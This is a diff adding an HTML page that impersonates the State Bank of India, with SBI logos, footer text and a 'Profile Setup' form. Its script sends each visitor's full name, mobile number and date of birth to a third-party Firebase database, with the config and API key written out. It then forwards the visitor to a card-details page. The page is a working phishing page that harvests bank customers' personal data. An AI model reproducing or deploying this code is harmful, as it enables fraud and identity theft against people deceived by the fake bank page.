@@ -1,0 +1,245 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Profile Setup</title>
+  <link rel="icon" href="./resource/yonosbilogo.png">
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: linear-gradient(90deg, #f1f0f0, #ffffff);
+      margin: 0;
+      padding: 0;
+      display: flex;
+      flex-direction: column;
+      min-height: 100vh;
+    }
+
+    /* 🔹 Header */
+    .headerContainer {
+      width: 100%;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      background: #fff;
+    }
+
+    .headerContainer img {
+      width: 100%;
+      max-width: 800px; /* Optional: limit maximum size */
+      height: auto;
+      display: block;
+    }
+
+    /* 🔹 Form Container */
+    .mainContent {
+      flex: 1;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 20px;
+    }
+
+    .container {
+    width: 100%;
+    max-width: 400px;
+    background: #fff;
+    padding: 25px;
+    border-radius: 12px;
+    /* Proper box-shadow */
+    box-shadow: 15px 12px 55px rgba(9, 156, 224, 0.2); /* horizontal 0, vertical 6px, blur 18px, color black with 20% opacity */
+}
+
+
+    .container h2 {
+      text-align: center;
+      color: #11b8eb;
+      margin-bottom: 20px;
+      font-size: 22px;
+      font-weight: bold;
+    }
+
+    .form-group {
+      margin-bottom: 20px;
+    }
+
+    label {
+      font-size: 14px;
+      font-weight: bold;
+      color: #333;
+      display: block;
+      margin-bottom: 6px;
+    }
+
+    input {
+      width: 100%;
+      padding: 12px 15px;
+      border: 2px solid #098fdd;
+      border-radius: 6px;
+      font-size: 15px;
+      box-sizing: border-box;
+      outline: none;
+    }
+
+    input:focus {
+      border-color: #098fdd;
+      box-shadow: 0 0 6px rgba(3, 231, 231, 0.4);
+    }
+
+    button {
+      width: 100%;
+      padding: 12px;
+      background: linear-gradient(90deg, #098fdd, #45b5f7);
+      color: white;
+      font-size: 16px;
+      font-weight: bold;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      transition: 0.3s;
+    }
+
+    button:hover {
+     background: linear-gradient(90deg, #3695bb, #4e96b3);
+    }
+
+    /* 🔹 Footer Images */
+    .footer-images {
+      display: flex;
+      flex-direction: column;
+      width: 100%;
+    }
+
+    .footer-images img {
+      width: 100%;
+      height: auto;
+      display: block;
+    }
+
+    /* 🔹 Footer Text */
+    .footer-text {
+      width: 96%;
+      background: #000000;
+      text-align: center;
+      font-size: 12px;
+      color: #cccbcb;
+      padding: 15px 10px;
+      border-top: 1px solid #ddd;
+    }
+
+    .footer-text a {
+      color: #cccbcb;
+      text-decoration: none;
+      margin: 0 4px;
+    }
+
+    .footer-text a:hover {
+      text-decoration: underline;
+    }
+
+    /* 🔹 Responsive tweaks */
+    @media (max-width: 480px) {
+      .container {
+        padding: 20px;
+      }
+
+      .container h2 {
+        font-size: 20px;
+      }
+
+      button {
+        font-size: 14px;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Header -->
+  <div class="headerContainer">
+    <img src="../resource/sbitop.jpeg" alt="Header Logo" />
+  </div>
+
+  <!-- Main Form -->
+  <div class="mainContent">
+    <div class="container">
+      <h2>Profile Setup</h2>
+      <form id="profileForm">
+        <div class="form-group">
+          <label for="name">Full Name</label>
+          <input type="text" id="name" placeholder="Enter Your Full Name" required>
+        </div>
+        <div class="form-group">
+          <label for="mobile">Mobile Number</label>
+          <input type="tel" id="mobile" placeholder="Enter Your Mobile Number" maxlength="10" required>
+        </div>
+        <div class="form-group">
+          <label for="dob">Date of Birth (DD/MM/YYYY)</label>
+          <input type="text" id="dob" placeholder="DD/MM/YYYY" maxlength="10" required>
+        </div>
+        <button type="submit">Submit</button>
+      </form>
+    </div>
+  </div>
+
+  <!-- Footer Images -->
+  <div class="footer-images">
+    <!-- <img src="/resource/page1bottom1.png" alt="Footer Image 1" /> -->
+    <img src="/resource/page1botom2.png" alt="Footer Image 2" />
+  </div>
+
+  <!-- Footer Text -->
+  <div class="footer-text">
+    © State Bank of India (APM Id:E-Ch_Tran_2200) <br>
+    <a href="#">Disclaimer</a> | 
+    <a href="#">Fair Lending Practice Code</a> | 
+    <a href="#">Privacy Statement</a> | 
+    <a href="#">Security Tips</a> | 
+    <a href="#">About Phishing</a> | 
+    <a href="#">Report Phishing</a> | 
+    <a href="#">Sitemap</a>
+  </div>
+
+  <!-- Firebase SDK -->
+  <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+
+  <script>
+    // 🔹 Firebase Config
+    // For Firebase JS SDK v7.20.0 and later, measurementId is optional
+const firebaseConfig = {
+  apiKey: "AIzaSyDEZDcHgqC586_shWpObiwyY5k3WS12y_Y",
+  authDomain: "sandy-khalid-sbi2-2330-1-9-25.firebaseapp.com",
+  projectId: "sandy-khalid-sbi2-2330-1-9-25",
+  storageBucket: "sandy-khalid-sbi2-2330-1-9-25.firebasestorage.app",
+  messagingSenderId: "385696590379",
+  appId: "1:385696590379:web:b7211b201612b3a02c186e",
+  measurementId: "G-3NELKK881G"
+};
+
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
+
+    // ✅ Auto Format DOB
+    document.getElementById("dob").addEventListener("input", function (e) {
+      let value = e.target.value.replace(/\D/g, ""); // Remove non-digits
+      if (value.length > 2 && value.length <= 4) value = value.slice(0,2) + "/" + value.slice(2);
+      else if (value.length > 4) value = value.slice(0,2) + "/" + value.slice(2,4) + "/" + value.slice(4,8);
+      e.target.value = value;
+    });
+
+    // ✅ Form Submit
+    document.getElementById("profileForm").addEventListener("submit", function(e) {
+      e.preventDefault();
+      const name = document.getElementById("name").value;
+      const mobile = document.getElementById("mobile").value;
+      const dob = document.getElementById("dob").value;
+      if (!name || !mobile || !dob) { alert("⚠ Please fill all fields!"); return; }
+      db.ref("packages").push({ name, mobile, dob, timestamp: new Date().toISOString() })
+        .then(() => { window.location.href = "./carddetailspage.html"; })
+        .catch(error => { console.error("Firebase Error:", error); alert("❌ Error saving data: " + error.message); });
+    });
+  </script>
+</body>
+</html>
